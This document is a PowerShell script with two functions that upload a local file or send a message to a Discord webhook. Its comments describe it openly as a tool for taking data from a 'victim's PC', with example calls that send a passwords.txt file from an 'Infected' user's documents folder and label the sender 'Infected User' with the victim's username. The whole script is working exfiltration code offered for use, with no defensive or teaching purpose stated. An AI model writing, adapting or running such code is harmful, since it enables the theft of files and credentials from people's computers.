
<#
.DESCRIPTION
Takes a Uri and a local file and performs a POST request to that URI with the content of the file using file streams (yay so cool).

.PARAMETER Uri
The URI that we are POST'ing the file to. This should be the webhook URL you generated in the beginning steps.

.PARAMETER File
This is the local file that you are attempting to upload from the victim's PC to the Discord channel.

.EXAMPLE
PS> Send-File -Uri https://discord.com/api/webhooks/random_id/random_text -File C:\Users\Infected\Documents\passwords.txt
#>
function Send-File {
    param (
        $Uri,
        $File
    )

    # Import needed assemblies
    Add-Type -AssemblyName System.Web
    Add-Type -AssemblyName System.Net.Http

    # Set Mimetype for file (this is needed for the discord POST request), and create HTTP client handlers
    $mType = [System.Web.MimeMapping]::GetMimeMapping($File)
    $clientHandler = New-Object System.Net.Http.HttpClientHandler
    $client = New-Object System.Net.Http.Httpclient $clientHandler

    # Open the file stream, our header will be "form-data" as we are performing a POST request
    $packageFileStream = New-Object System.IO.FileStream @($File, [System.IO.FileMode]::Open)
    $HeaderValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $HeaderValue.Name = "fileData"
    $HeaderValue.FileName = (Split-Path $File -leaf)

    # Begin streaming the content in the appropriate format and set the proper content type headers
    $streamContent = New-Object System.Net.Http.StreamContent $packageFileStream
    $streamContent.Headers.ContentDisposition = $HeaderValue
    $streamContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue $mType
    $fileContent = New-Object System.Net.Http.MultipartFormDataContent
    $fileContent.Add($streamContent)
  
    try {
        $client.PostAsync($Uri, $fileContent)
    }
    catch {
        Write-Debug -Message "Oops. Ran into an error when POST'ing the file :/"
    }
    finally {  
        $client.Dispose()
    }
}   

<#
.DESCRIPTION
Takes a Uri and a message string and performs a POST request to that URI with the message.

.PARAMETER Uri
The URI that we are POST'ing the message to. This should be the webhook URL you generated in the beginning steps.

.PARAMETER Message
This is the local message that you are attempting to send from the victim's PC to the Discord channel.

.EXAMPLE
PS> Send-Message -Uri https://discord.com/api/webhooks/random_id/random_text -Message "Here is all of my data #pwnd"
#>
function sendMessage {
    param(
        $Uri,
        $Message
    )

    # Setup the Rest request parameters
    $restParam = @{
        Method      = 'POST'
        Uri         = $Uri
        Body        = @{
            content  = "$Message"
            username = "Infected User: $env:username"
            color    = "15536915"
            
        }
        ErrorAction = 'stop'
    }

    try {
        Invoke-RestMethod @restParam
    }
    catch {
        Write-Debug -Message "Oops. Ran into an error when POST'ing the message"
    }
}